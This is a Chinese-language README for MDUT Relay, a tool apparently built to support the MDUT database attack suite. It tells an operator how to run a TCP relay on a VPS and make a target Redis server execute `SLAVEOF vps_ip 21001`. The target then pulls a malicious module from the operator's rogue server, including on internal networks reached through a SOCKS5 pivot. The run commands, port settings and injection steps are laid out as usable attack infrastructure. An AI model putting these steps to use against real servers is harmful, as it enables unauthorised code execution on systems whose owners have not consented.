# MDUT Relay

MDUT Relay 是为 [MDUT (Multiple Database Utilization Tools)](https://github.com/SafeGroceryStore/MDUT) 专门设计的独立网络中转辅助工具。

## 为什么需要它？

在进行 Redis 模块注入（通过主从复制 `SLAVEOF` 机制）时，目标 Redis 必须能够主动连接到我们的 `Rogue Server` 并同步载荷。然而，在以下场景中，MDUT 本地发起的监听端口对目标是不可达的：
1. **深层内网环境**：MDUT 本地和目标机器不在同一网段，且目标机器被配置为仅允许出网到特定公网 IP。
2. **正向代理（SOCKS5）环境**：MDUT 通过 SOCKS5 代理打入内网，此时 MDUT 本地的 IP 对于目标内网来说是未知的，目标无法反向连接回 MDUT。

**MDUT Relay 解决了这个问题**：它作为一个轻量级的透明 TCP 流量桥接器运行在公网 VPS 上，将 MDUT 的控制端流量和目标 Redis 的流量完美桥接，实现无感知的模块投递。

## 运行机制

1. `mdut-relay` 启动后监听两个端口：控制端端口（默认 `21000`）和目标连入端口（默认 `21001`）。
2. MDUT 发起部署时，主动连接 `21000` 端口。
3. MDUT 告诉目标 Redis 去执行 `SLAVEOF vps_ip 21001`。
4. 目标 Redis 主动连入 `21001` 端口。
5. `mdut-relay` 配对两个连接，开始全双工透明转发，投递载荷完成后断开。

*(注：内建了 15 秒超时重置机制，如果目标由于网络阻断没能连上，Relay 会自动断开重置，避免队列阻塞死锁。)*

## 使用说明

### 1. VPS 上运行

请在您的 VPS 上下载对应架构的发行版二进制文件，赋予执行权限后直接运行：

```bash
chmod +x mdut-relay-linux-amd64
./mdut-relay-linux-amd64 -c 21000 -r 21001
```

*参数说明：*
- `-c`：控制端端口（供 MDUT 客户端连入），默认 `21000`
- `-r`：目标端端口（供目标 Redis 连入），默认 `21001`

**🚨 重要提示**：请确保您的 VPS 防火墙或云服务商的安全组中**同时放行了 21000 和 21001 端口的 TCP 入站流量**！

### 2. MDUT 中配置

在 MDUT 面板的 Redis “注入并部署 Module” 弹窗中：
1. 选择 **“VPS 中转 (ServeRelay)”** 模式。
2. **VPS Relay 控制端地址**：填入 `VPS的IP:21000`。
3. **VPS 目标连入 IP**：填入 `VPS的IP`。
4. 点击注入即可！

## 构建指南

您可以直接使用项目中提供的 `build.sh` 进行全平台交叉编译：

```bash
./build.sh
```

或者使用 Go 编译：

```bash
go build -o mdut-relay main.go
```
